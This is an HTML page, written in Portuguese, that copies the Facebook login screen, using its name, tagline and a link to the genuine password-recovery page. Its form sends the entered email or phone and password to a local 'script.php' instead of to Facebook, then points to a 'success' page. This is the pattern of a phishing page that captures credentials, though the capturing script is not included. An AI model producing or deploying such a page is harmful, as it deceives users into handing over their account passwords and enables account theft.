<html lang="pt-br">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="./styles.css" />
  </head>
  <body>
    <div class="content">
      <div class="flex-div">
        <div class="name-content">
          <h1 class="logo">Facebook</h1>
          <p>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
        </div>
          <form action="script.php">
            <input id="user" type="text" name="user" placeholder="Email ou Telefone" required />
            <input id="pass" type="password" name="password" placeholder="Senha" required>
            <button type="submit" class="login" href="succefull.html">Entrar</button>
            <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzEzODMxMDE3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login">Esqueceu a senha?</a>
            
          </form>
      </div>
    </div>
  </body>
</html>
